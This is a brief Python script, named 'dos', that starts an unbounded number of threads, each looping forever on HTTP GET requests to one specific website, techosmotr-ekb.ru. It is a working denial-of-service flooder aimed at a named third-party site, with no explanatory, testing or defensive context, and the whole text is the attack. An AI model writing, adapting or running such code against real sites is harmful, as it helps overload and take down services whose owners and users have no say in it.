import requests, threading

def dos():
    while True:
        requests.get("http://techosmotr-ekb.ru/")


while True:
    threading.Thread(target=dos).start()